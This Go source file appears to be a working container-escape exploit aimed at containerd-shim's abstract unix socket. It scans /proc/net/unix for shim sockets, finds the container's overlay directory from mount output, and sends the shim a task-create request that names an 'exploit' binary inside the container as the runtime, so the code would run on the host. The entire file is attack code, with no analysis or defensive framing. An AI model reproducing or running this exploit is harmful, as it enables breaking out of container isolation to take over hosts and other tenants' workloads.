package main

import (
	"context"
	"encoding/hex"
	"errors"
	"fmt"
	io "io"
	"io/ioutil"
	"log"
	"net"
	"os/exec"
	"regexp"
	"strings"

	types "github.com/containerd/containerd/api/types"
	"github.com/containerd/ttrpc"
	"github.com/docker/docker/pkg/random"
)

func exp(sock string) bool {
	sock = strings.Replace(sock, "@", "", -1)
	conn, err := net.Dial("unix", "\x00"+sock)
	if err != nil {
		log.Println(err)
		return false
	}

	client := ttrpc.NewClient(conn)
	shimClient := NewShimClient(client)
	ctx := context.Background()

	containerID := getContainerID(sock)
	mountPath := getMountPath()
	exePath := fmt.Sprintf("%s/merged/root/exploit", mountPath)

	if mountPath == "" || exePath == "" {
		return false
	}

	state, err := shimClient.State(ctx, &StateRequest{
		ID: containerID,
	})
	if err != nil {
		log.Println("state error:", err)
		return false
	}
	request := CreateTaskRequest{
		ID:               containerID,
		Bundle:           state.Bundle,
		Terminal:         false,
		Stdin:            state.Stdin,
		Stdout:           state.Stdout,
		Stderr:           state.Stderr,
		Checkpoint:       "/test",
		ParentCheckpoint: "/",
		Runtime:          exePath,
	}
	for _, m := range mounts {
		request.Rootfs = append(request.Rootfs, &types.Mount{
			Type:    m.Type,
			Source:  m.Source,
			Target:  m.Target,
			Options: m.Options,
		})
	}

	createResponse, err := shimClient.Create(ctx, &request)
	if err != nil {
		log.Println("create error:", err)
		return false
	}
	fmt.Printf("create response: %v\n", createResponse)

	startResponse, err := shimClient.Start(ctx, &StartRequest{
		ID: containerID,
	})
	if err != nil {
		log.Println("start error:", err)
		return false
	}
	fmt.Printf("start response: %v\n", startResponse)

	return true
}

func getShimSockets() ([][]byte, error) {
	re, err := regexp.Compile("@/containerd-shim/.*\\.sock")
	if err != nil {
		return nil, err
	}
	data, err := ioutil.ReadFile("/proc/net/unix")
	matches := re.FindAll(data, -1)
	if matches == nil {
		return nil, errors.New("no socket")
	}
	return matches, nil
}

func generateID() string {
	b := make([]byte, 32)
	var r io.Reader = random.Reader
	for {
		if _, err := io.ReadFull(r, b); err != nil {
			panic(err) // This shouldn't happen
		}
		id := hex.EncodeToString(b)
		return id
	}
}

func getContainerID(sock string) string {
	re := regexp.MustCompile("/[0-9a-f]+/")
	containers := re.FindAllStringSubmatch(sock, -1)
	if len(containers) == 0 {
		return ""
	}
	containerID := containers[0][0]
	return strings.Trim(containerID, "/")
}

func getMountPath() string {
	cmd := exec.Command("mount")
	out, _ := cmd.CombinedOutput()
	re := regexp.MustCompile("upperdir=.*diff")
	paths := re.FindAll(out, -1)
	if len(paths) == 0 {
		return ""
	}
	path := strings.Replace(string(paths[0]), "upperdir=", "", -1)
	path = strings.Replace(path, "/diff", "", -1)
	return path
}

func main() {
	matchset := make(map[string]bool)
	socks, err := getShimSockets()
	if err != nil {
		log.Fatal(err)
	}
	for _, b := range socks {
		sockname := string(b)
		if _, ok := matchset[sockname]; ok {
			continue
		}
		log.Println("try:", sockname)
		matchset[sockname] = true
		if exp(sockname) {
			break
		}
	}

	return
}
